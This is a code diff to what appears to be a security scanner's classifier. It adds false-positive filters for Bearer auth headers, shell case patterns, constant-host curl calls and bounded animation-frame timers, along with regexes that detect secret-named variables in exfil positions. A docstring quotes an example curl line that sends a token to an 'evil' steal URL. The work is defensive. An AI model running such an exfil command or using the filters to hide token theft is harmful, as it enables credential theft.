@@ -673,6 +673,248 @@ def _is_api_field_name_match_shell(line: str, match: str) -> bool:
     return True
 
 
+# ──────────────────────────────────────────────────────────────────────
+# Issue #59 (2026-05-30) — live-sink-but-legitimate shell FP discriminators.
+# These four shapes reach a real sink (curl / a JS runtime) yet are
+# semantically benign; #57's inert-data-vs-sink analysis does NOT clear them
+# because the value genuinely flows to a sink. Each helper distinguishes the
+# benign shape from its malicious counterpart with high certainty and
+# DEFAULTS TO KEEP (returns False) whenever certainty is not reachable.
+# Two-sided tested in tests/test_issue_59_shell_live_sink_fp.py.
+# ──────────────────────────────────────────────────────────────────────
+
+# Credential-bearing variable-name signal (used by A1 + A3 to keep an
+# outbound request VISIBLE when it carries a secret into an exfil position).
+_SECRET_VAR_NAME_RE: Final[re.Pattern[str]] = re.compile(
+    r"(?:KEY|TOKEN|SECRET|PASSW|PASSWD|PASSWORD|CRED|CREDENTIAL|APIKEY"
+    r"|PRIVATE|SESSION|COOKIE|BEARER)",
+    re.IGNORECASE,
+)
+
+# A1 — credential_theft TOKEN_STEAL. ``Authorization: Bearer ${VAR}`` in a
+# request header is the universal API-auth idiom (the operator's own
+# configured key authenticating to its own API). It is credential THEFT
+# only if the SAME credential is simultaneously redirected into an exfil
+# position on the line (a URL query parameter or a POST body) — which is
+# how a stealer leaks it. A separate exfil on another line is caught by
+# that line's own rule.
+_BEARER_AUTH_VAR_RE: Final[re.Pattern[str]] = re.compile(
+    r"Authorization:\s*Bearer\s+\$\{?(?P<var>[A-Za-z_]\w*)\}?",
+    re.IGNORECASE,
+)
+
+
+def _exfil_position_ref(line: str, var: str) -> bool:
+    """True iff shell variable ``var`` is interpolated into a URL
+    query-parameter (``?k=…$VAR`` / ``&k=…$VAR``) or a curl POST body
+    (``-d``/``--data*`` …``$VAR``) on ``line`` — i.e. an exfil sink."""
+    var_ref = r"\$\{?" + re.escape(var) + r"\}?"
+    exfil_re = re.compile(
+        r"[?&][^=\s&\"']+=[^\s\"'&]*" + var_ref
+        + r"|(?:-d|--data(?:-raw|-binary|-urlencode|-ascii)?)\b[^\n]*" + var_ref
+    )
+    return bool(exfil_re.search(line))
+
+
+def _is_bearer_auth_not_exfil(line: str) -> bool:
+    """True iff a TOKEN_STEAL ``Authorization: Bearer`` match is an
+    outbound auth header built from a shell-variable credential that is
+    NOT also leaked into a URL-query / POST-body exfil position on the
+    same line.
+
+    Benign (suppress):  ``--header "Authorization: Bearer ${API_KEY}"``
+    Malicious (keep):   ``--header "Authorization: Bearer ${TOKEN}"
+                          "https://evil/steal?d=${TOKEN}"`` — the same
+                        credential is reused in a ``?d=`` query → exfil.
+
+    Hardcoded literal bearer tokens (no ``$VAR``) are NOT suppressed
+    (those are a hardcoded-secret concern, kept visible).
+    """
+    m = _BEARER_AUTH_VAR_RE.search(line)
+    if not m:
+        return False  # literal / odd bearer shape → keep visible
+    return not _exfil_position_ref(line, m.group("var"))
+
+
+# A2 — code_execution CMD_INJECTION. The pattern
+# ``(?:;|\||&&)\s*\b(?:curl|wget|…)\b`` fires on the ``|curl`` inside a
+# shell ``case`` glob-alternation pattern list
+# (``dev-browser|curl|auto|manual)``) — but a case pattern list is a set of
+# MATCH globs, never executed commands; the ``|`` is alternation, not a
+# pipe. Suppress only when the match sits in the pattern portion (before the
+# case-branch ``)``) inside an open ``case … in`` block. A real ``;``/``|``
+# command in the branch BODY (after the ``)``) stays visible.
+_CASE_PATTERN_CLAUSE_RE: Final[re.Pattern[str]] = re.compile(
+    r"^\s*\(?\s*[\w*?.\[\]{}@:+/-]+(?:\s*\|\s*[\w*?.\[\]{}@:+/-]+)+\s*\)"
+)
+_CASE_OPEN_RE: Final[re.Pattern[str]] = re.compile(r"\bcase\b.+\bin\b")
+_ESAC_RE: Final[re.Pattern[str]] = re.compile(r"\besac\b")
+
+
+def _inside_case_block(lines: list[str], line_idx: int) -> bool:
+    """True iff ``lines[line_idx]`` is inside an open ``case … in … esac``
+    block (the nearest unmatched ``case … in`` scanning upward)."""
+    pending_esac = 0
+    for i in range(line_idx - 1, -1, -1):
+        s = lines[i]
+        if _ESAC_RE.search(s):
+            pending_esac += 1
+        elif _CASE_OPEN_RE.search(s):
+            if pending_esac == 0:
+                return True
+            pending_esac -= 1
+    return False
+
+
+def _match_inside_case_pattern(lines: list[str], line_idx: int, match: str) -> bool:
+    """True iff a CMD_INJECTION ``|binary`` match falls inside a shell
+    ``case`` branch's glob-alternation PATTERN list (not its command
+    body)."""
+    line = lines[line_idx]
+    m = _CASE_PATTERN_CLAUSE_RE.match(line)
+    if not m:
+        return False
+    close_paren = m.end() - 1  # position of the case-branch ')'
+    mpos = line.find(match)
+    if mpos < 0:
+        mpos = line.find(match.strip())
+    if not (0 <= mpos < close_paren):
+        return False  # match is in the branch BODY, after ')'
+    return _inside_case_block(lines, line_idx)
+
+
+# A3 — network SSRF_ADVANCED. The pattern ``curl\s+.*\$(?:\{|\()`` fires on
+# ANY curl that references a shell variable (even an options array like
+# ``${CURL_OPTS[@]}``). SSRF by definition requires an ATTACKER-CONTROLLABLE
+# destination host. Suppress only when the curl's destination URL resolves
+# to a CONSTANT host (a string literal, or a variable whose in-file
+# assignment chain bottoms out in a literal ``https://host/…``; env-var
+# defaults ``${X:-https://host}`` count as literal) AND no secret-looking
+# variable is interpolated into the query/body (exfil to a fixed host is
+# NOT SSRF but stays visible). KEEP when the host is fed by a positional
+# parameter / ``read`` / user input.
+_POSITIONAL_INPUT_RE: Final[re.Pattern[str]] = re.compile(
+    r"\$[1-9]\b|\$[{(]\s*[1-9@*#]|\$[@*]|\$\{?REPLY\b|\bread\b\s+-?\w"
+)
+_SCHEME_LITERAL_HOST_RE: Final[re.Pattern[str]] = re.compile(
+    r"https?://[A-Za-z0-9.\-]+"
+)
+_VAR_REF_RE: Final[re.Pattern[str]] = re.compile(r"\$\{?(?P<name>[A-Za-z_]\w*)")
+# URL-bearing variable NAMES, matched per identifier-token (split on ``_``
+# and camelCase) so ``CURL_OPTS`` → {CURL, OPTS} does NOT count as a URL var
+# while ``API_ENDPOINT`` → {API, ENDPOINT} and ``baseUrl`` → {base, Url} do.
+_URLISH_NAME_TOKENS: Final[frozenset[str]] = frozenset(
+    {
+        "url", "urls", "uri", "uris", "endpoint", "endpoints", "target",
+        "host", "hostname", "link", "addr", "address", "href", "src",
+        "origin", "baseurl",
+    }
+)
+
+
+def _name_is_urlish(name: str) -> bool:
+    """True iff any identifier-token of ``name`` is a URL-bearing word."""
+    tokens = re.split(r"[_\W]+|(?<=[a-z])(?=[A-Z])", name)
+    return any(t.lower() in _URLISH_NAME_TOKENS for t in tokens if t)
+
+
+def _resolve_shell_var(lines: list[str], upto_idx: int, var: str) -> str | None:
+    """Return the RHS of the LAST ``var=…`` assignment before ``upto_idx``,
+    or ``None`` if unassigned in-file."""
+    assign_re = re.compile(
+        r"^\s*(?:export\s+|local\s+|declare\s+(?:-\w+\s+)?)?"
+        + re.escape(var) + r"\+?=(.*)$"
+    )
+    val: str | None = None
+    for i in range(min(upto_idx, len(lines))):
+        m = assign_re.match(lines[i])
+        if m:
+            val = m.group(1).strip()
+    return val
+
+
+def _value_host_is_constant(lines: list[str], upto_idx: int, value: str, depth: int = 0) -> bool:
+    """True iff ``value``'s URL host portion is a compile-time constant
+    (a string literal, or an in-file assignment chain bottoming out in a
+    literal host). False on any positional / ``read`` / user-input
+    influence, or an opaque value that cannot be proven constant."""
+    if depth > 8 or not value:
+        return False
+    if _POSITIONAL_INPUT_RE.search(value):
+        return False
+    if _SCHEME_LITERAL_HOST_RE.search(value):
+        return True  # literal scheme+host present (host class excludes '$')
+    first = _VAR_REF_RE.search(value)
+    if not first:
+        return False  # opaque value → cannot prove constant → keep
+    inner = _resolve_shell_var(lines, upto_idx, first.group("name"))
+    if inner is None:
+        return False  # unresolved (could be env / user) → keep
+    return _value_host_is_constant(lines, upto_idx, inner, depth + 1)
+
+
+def _curl_target_host_is_constant(lines: list[str], line_idx: int) -> bool:
+    """True iff the curl command on ``lines[line_idx]`` sends to a
+    constant-host destination AND leaks no secret-looking variable into
+    the query/body — i.e. the SSRF_ADVANCED match is a FP."""
+    line = lines[line_idx]
+    # A credential interpolated into the query / body keeps the finding
+    # visible (exfil to a fixed host is still a threat).
+    for vm in _VAR_REF_RE.finditer(line):
+        name = vm.group("name")
+        if _SECRET_VAR_NAME_RE.search(name) and _exfil_position_ref(line, name):
+            return False
+    # Identify URL-bearing variables referenced on the curl line.
+    url_vars: list[str] = []
+    for vm in _VAR_REF_RE.finditer(line):
+        name = vm.group("name")
+        val = _resolve_shell_var(lines, line_idx, name)
+        if _name_is_urlish(name) or (val is not None and "://" in val):
+            url_vars.append(name)
+    if not url_vars:
+        # No URL variable — a direct literal URL on the line is constant
+        # unless a positional parameter feeds it.
+        if _SCHEME_LITERAL_HOST_RE.search(line):
+            return not bool(_POSITIONAL_INPUT_RE.search(line))
+        return False  # cannot identify the destination → keep
+    for name in url_vars:
+        val = _resolve_shell_var(lines, line_idx, name)
+        if val is None or not _value_host_is_constant(lines, line_idx, val):
+            return False
+    return True
+
+
+# A4 — resource_abuse RESOURCE_ABUSE. The pattern matches two timer calls on
+# one line. A double ``requestAnimationFrame`` whose innermost call resolves
+# an enclosing Promise is a "settle one paint" helper — it resolves after
+# exactly two frames and CANNOT loop. Suppress only that exact bounded
+# shape; a ``setInterval`` (inherently repeating) or a self-rescheduling rAF
+# loop stays visible.
+_PROMISE_RESOLVER_RE: Final[re.Pattern[str]] = re.compile(
+    r"new\s+Promise\s*\(\s*\(?\s*(?P<res>[A-Za-z_$][\w$]*)"
+)
+_INNER_RAF_ARG_RE: Final[re.Pattern[str]] = re.compile(
+    r"requestAnimationFrame\s*\(\s*(?P<arg>[A-Za-z_$][\w$]*)\s*\)"
+)
+
+
+def _is_bounded_promise_double_raf(line: str) -> bool:
+    """True iff a RESOURCE_ABUSE nested-timer match is a bounded
+    double-``requestAnimationFrame`` Promise-settle helper."""
+    if "setInterval" in line or "setTimeout" in line:
+        return False  # repeating timers are never the bounded settle shape
+    if line.count("requestAnimationFrame") < 2:
+        return False
+    pm = _PROMISE_RESOLVER_RE.search(line)
+    if not pm:
+        return False  # not a Promise-settle → keep (conservative)
+    im = _INNER_RAF_ARG_RE.search(line)
+    if not im:
+        return False
+    arg = im.group("arg")
+    return arg == pm.group("res") or arg in {"resolve", "res", "r", "done"}
+
+
 def classify(
     file_path: str,
     content: str,
@@ -744,6 +986,23 @@ def classify(
     if rule_id == "CMD_INJECTION" and _cmdsub_is_safe_data_command(line_text, match):
         return "safe_literal"
     if rule_id == "CMD_INJECTION" and _pipe_to_text_processor(line_text, match):
+        return "safe_literal"
+
+    # Issue #59 (2026-05-30) — live-sink-but-legitimate shapes. Each is a
+    # high-certainty FP that reaches a real sink; the helpers default to KEEP
+    # whenever certainty is unreachable, and the malicious counterpart of each
+    # stays VISIBLE (two-sided tested).
+    # A1 — Authorization: Bearer ${VAR} auth header (not credential exfil).
+    if rule_id == "TOKEN_STEAL" and _is_bearer_auth_not_exfil(line_text):
+        return "safe_literal"
+    # A2 — |binary inside a case glob-alternation pattern list (not a pipe).
+    if rule_id == "CMD_INJECTION" and _match_inside_case_pattern(lines, line_idx, match):
+        return "safe_literal"
+    # A3 — curl to a constant-host destination (not attacker-controlled SSRF).
+    if rule_id == "SSRF_ADVANCED" and _curl_target_host_is_constant(lines, line_idx):
+        return "safe_literal"
+    # A4 — bounded double-requestAnimationFrame Promise-settle (not a loop).
+    if rule_id == "RESOURCE_ABUSE" and _is_bounded_promise_double_raf(line_text):
         return "safe_literal"
 
     # r08 sangrokjung FP iter (2026-05-28) — Python embedded in a shell file.
